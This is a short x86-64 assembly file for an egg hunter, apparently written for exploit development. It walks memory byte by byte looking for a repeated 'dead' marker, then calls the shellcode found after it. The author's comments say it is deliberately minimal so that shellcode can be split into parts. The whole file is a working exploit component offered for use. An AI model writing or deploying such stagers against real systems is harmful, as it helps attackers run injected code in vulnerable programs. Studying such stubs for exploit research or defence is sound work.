global _start

_start:
	pop rax  ; go into the stack 

	
	respawn:	
		inc rax
	
		cmp [rax - 4] , dword 0x64616564 ; "dead"
	
	jnz respawn
		cmp [rax - 8] , dword 0x64616564  ; if this part is pointed by [rax - 8] rax point to the begin of the shellcode;

	jnz respawn

		call  rax


;I use the shortest code to build this hunter , if you need to split a shellcode to a multiple part ; the hunter must be the shortest possible ;
;no hardcoded address to a variable


